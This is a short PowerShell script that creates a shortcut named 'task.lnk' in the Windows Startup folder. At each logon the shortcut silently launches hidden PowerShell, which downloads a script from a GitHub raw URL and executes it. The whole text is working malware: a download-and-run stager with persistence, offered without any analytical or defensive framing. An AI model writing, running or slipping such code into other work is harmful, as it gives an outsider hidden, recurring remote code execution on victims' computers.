$cmd = 'powershell -WindowStyle Hidden -Command "iex (iwr "https://raw.githubusercontent.com/guilegel4/server/refs/heads/main/pi.ps1")"'
$path = [System.Environment]::GetFolderPath('Startup') + "\task.lnk"
$ws = New-Object -ComObject WScript.Shell
$sc = $ws.CreateShortcut($path)
$sc.TargetPath = "cmd.exe"
$sc.Arguments = "/c $cmd"
$sc.IconLocation = "cmd.exe"
$sc.Save()
